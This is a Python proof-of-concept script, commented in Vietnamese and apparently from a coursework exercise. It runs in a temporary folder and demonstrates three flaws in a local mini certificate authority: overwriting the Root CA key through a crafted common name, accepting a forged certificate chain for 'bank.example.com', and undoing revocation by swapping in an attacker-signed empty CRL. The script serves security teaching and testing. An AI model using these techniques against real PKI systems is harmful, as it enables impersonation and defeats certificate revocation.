"""
PoC cac diem yeu cua mini-ca. Chay AN TOAN trong thu muc tam,
KHONG dung toi thu muc certs/ that cua ban.

Cach chay:
    cd D:\\TH_LTANTT_2387700073\\Buoi2\\security-poc
    python poc_ca.py
"""
import os
import sys
import tempfile

MINI_CA = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "mini-ca")
sys.path.insert(0, MINI_CA)

# chdir sang thu muc tam TRUOC khi import, vi ca_utils tao "certs/" luc import
work = tempfile.mkdtemp(prefix="ca_poc_")
os.chdir(work)
print(f"[i] Thu muc lam viec tam: {work}\n")

import ca_utils
import revoke_utils
from cryptography import x509


def line(t):
    print("\n" + "=" * 60 + f"\n{t}\n" + "=" * 60)


# ---------------------------------------------------------------
line("PoC 2 - common_name ghi de khoa Root CA")
# ---------------------------------------------------------------
rk, rc = ca_utils.create_root_ca()
ik, ic = ca_utils.create_intermediate_ca(rk, rc)

root_key_path = os.path.join("certs", "root_ca_key.pem")
before = open(root_key_path, "rb").read()

# common_name = "root_ca" -> filename "root_ca_key.pem" TRUNG file khoa Root
ca_utils.issue_certificate(ik, ic, {
    "common_name": "root_ca", "org": "Attacker", "country": "VN"
})

after = open(root_key_path, "rb").read()
print(f"Khoa Root truoc/sau co giong nhau khong? {before == after}")
print(">>> KET QUA:", "BI GHI DE (khoa Root da bi thay!)" if before != after
      else "khong bi anh huong")


# ---------------------------------------------------------------
line("PoC 3 - Chuoi tin cay gia mao (khong co trust anchor)")
# ---------------------------------------------------------------
# Ke tan cong dung PKI RIENG cua ho, khong lien quan Root that
atk_rk, atk_rc = ca_utils.create_root_ca()          # tao trong temp
atk_ik, atk_ic = ca_utils.create_intermediate_ca(atk_rk, atk_rc)
fake_key, fake_cert = ca_utils.issue_certificate(atk_ik, atk_ic, {
    "common_name": "bank.example.com", "org": "Fake Bank", "country": "VN"
})

# Nop chuoi cua chinh ke tan cong -> ham van bao hop le
result = ca_utils.verify_certificate_chain(fake_cert, [atk_ic, atk_rc])
print(f"verify_certificate_chain(cert gia, chuoi cua ke tan cong) = {result}")
print(">>> KET QUA:", "QUA MAT (chap nhan cert gia mao!)" if result
      else "bi tu choi")


# ---------------------------------------------------------------
line("PoC 4 - 'Go thu hoi' bang cach thay CRL")
# ---------------------------------------------------------------
# Cap 1 cert that va thu hoi no
uk, ucert = ca_utils.issue_certificate(ik, ic, {
    "common_name": "victim", "org": "Org", "country": "VN"
})
victim_path = os.path.join("certs", "victim_cert.pem")
inter_cert_path = os.path.join("certs", "intermediate_cert.pem")
inter_key_path = os.path.join("certs", "intermediate_key.pem")

revoke_utils.revoke_certificate(victim_path, inter_cert_path, inter_key_path)
print(f"Sau khi thu hoi: revoked = {revoke_utils.check_revocation_status(victim_path)}")

# Ke tan cong tao CRL RONG ky bang khoa CUA HO (khong phai CA that)
revoke_utils.create_empty_crl(atk_rc, atk_rk)  # ghi de ca_crl.pem bang CRL rong
print(f"Sau khi thay CRL gia: revoked = {revoke_utils.check_revocation_status(victim_path)}")
print(">>> KET QUA: chung chi da thu hoi gio lai bao 'Hop le' -> go thu hoi thanh cong")

print(f"\n[i] Xong. Xoa thu muc tam khi khong can: {work}")
